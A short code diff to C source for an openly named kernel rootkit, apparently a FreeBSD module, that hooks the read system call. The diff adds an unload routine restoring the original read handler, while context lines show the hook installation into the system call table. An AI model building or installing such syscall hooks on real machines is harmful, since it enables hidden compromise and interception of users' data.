@@ -46,6 +46,14 @@ initializeRootkit (void) {
   sysent[SYS_read].sy_call = (sy_call_t *) read_hook;
 }
 
+static void
+unloadRootkit (void) {
+  //
+  // Restore all hooked system calls.
+  //
+  sysent[SYS_read].sy_call = (sy_call_t *) sys_read;
+}
+
 //
 // Function: load()
 //
@@ -64,6 +72,7 @@ load (struct module * module, int cmd, void * arg) {
       break;
 
     case MOD_UNLOAD:
+      unloadRootkit();
       uprintf ("Rootkit: Removed\n");
       break;
 
